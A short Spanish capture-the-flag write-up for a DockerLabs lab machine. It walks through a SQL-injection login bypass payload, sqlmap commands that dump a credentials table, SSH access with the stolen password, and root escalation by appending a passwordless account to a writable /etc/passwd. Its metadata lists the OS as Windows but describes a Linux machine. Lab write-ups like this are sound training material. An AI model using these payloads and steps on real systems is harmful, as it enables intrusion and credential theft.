---
layout: writeup
title: "Injection"
platform: dockerlabs
difficulty: medio
os: windows
date: 2026-04-15
tags: [sqli, sql-injection, passwd, privesc]
description: "Máquina Linux con SQL injection en login. Extracción de credenciales y escalada via passwd writable."
---

## Reconocimiento

```bash
nmap -sV -sC -p- --min-rate 5000 172.17.0.2
```

Puerto 80 abierto con formulario de login.

## SQL Injection

Login bypass básico:

```
usuario: admin' or '1'='1
password: cualquier cosa
```

Acceso obtenido. Enumeramos la base de datos con SQLMap:

```bash
sqlmap -u "http://172.17.0.2/login.php" --data="user=admin&pass=test" --dbs
sqlmap -u "http://172.17.0.2/login.php" --data="user=admin&pass=test" -D users --tables
sqlmap -u "http://172.17.0.2/login.php" --data="user=admin&pass=test" -D users -T creds --dump
```

Credenciales extraídas: `dylan:KJSDFG789FGSDF74`.

## Acceso SSH

```bash
ssh dylan@172.17.0.2
```

## Escalada de Privilegios

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root ... /etc/passwd
```

El fichero `/etc/passwd` tiene permisos de escritura para todos. Añadimos usuario root:

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

```
root@injection:/# cat /root/root.txt
```
